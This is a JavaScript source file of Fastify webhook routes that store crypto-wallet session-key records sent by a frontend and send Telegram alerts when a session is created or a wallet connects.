/**
 * Webhook routes — receive events from the frontend SDK.
 *
 * POST /api/webhook/session     — session created by frontend
 * POST /api/webhook/connect     — wallet connected event
 */

import { Session }            from '../models/Session.js';
import { alertWalletConnected, alertSessionCreated } from '../telegram.js';

/**
 * Register webhook routes on the Fastify instance.
 * @param {import('fastify').FastifyInstance} fastify
 */
export async function webhookRoutes(fastify) {
  // POST /api/webhook/session
  fastify.post('/session', async (req, reply) => {
    const body = req.body;

    if (!body?.sessionKey || !body?.owner) {
      return reply.status(400).send({ error: 'sessionKey and owner are required' });
    }

    const session = await Session.findOneAndUpdate(
      { sessionKey: body.sessionKey },
      {
        sessionKey:       body.sessionKey,
        owner:            body.owner,
        allowedContracts: body.allowedContracts ?? [],
        allowedFunctions: body.allowedFunctions ?? [],
        spendingLimit:    body.spendingLimit ?? '0',
        expiresAt:        body.expiresAt,
        chainId:          body.chainId,
        txHash:           body.txHash,
        onChain:          body.onChain ?? false,
        status:           'active',
      },
      { upsert: true, new: true },
    );

    await alertSessionCreated({
      sessionKey: body.sessionKey,
      owner:      body.owner,
      expiresAt:  body.expiresAt,
      chainId:    body.chainId,
    });

    return reply.status(201).send({ session });
  });

  // POST /api/webhook/connect
  fastify.post('/connect', async (req, reply) => {
    const { address, chainId } = req.body ?? {};
    if (!address) {
      return reply.status(400).send({ error: 'address is required' });
    }
    await alertWalletConnected({ address, chainId });
    return reply.send({ success: true });
  });
}
